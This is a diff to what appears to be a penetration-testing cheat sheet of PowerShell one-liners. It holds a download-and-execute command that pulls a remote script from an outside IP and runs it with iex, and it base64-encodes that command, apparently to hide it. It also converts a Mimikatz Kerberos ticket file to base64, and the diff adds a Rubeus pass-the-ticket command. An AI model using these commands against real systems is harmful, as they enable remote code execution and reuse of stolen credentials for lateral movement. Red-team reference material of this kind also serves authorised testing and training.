@@ -60,9 +60,15 @@ $EncodedCommand
 $OriginalCommand = "iex (New-Object Net.WebClient).DownloadString('http://10.8.0.166:80/download/file.ps1')"
 [System.Convert]::ToBase64String([System.Text.Encoding]::unicode.GetBytes($OriginalCommand))
 ```
+### Convert this ticket to a base64 encoded
 ```
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi"))
-[System.IO.File]::WriteAllBytes("C:\Users\Commando\Desktop\Mimikatz_x64\zps.kirbi", [System.Convert]::FromBase64String("do"))
+Rubeus ptt /ticket:[...snip...]
+```
+
+
+```
+
 [System.Text.Encoding]::unicode.GetString([System.Convert]::FromBase64String(""))
 ```
 ### Download & execute powershell payload one liner
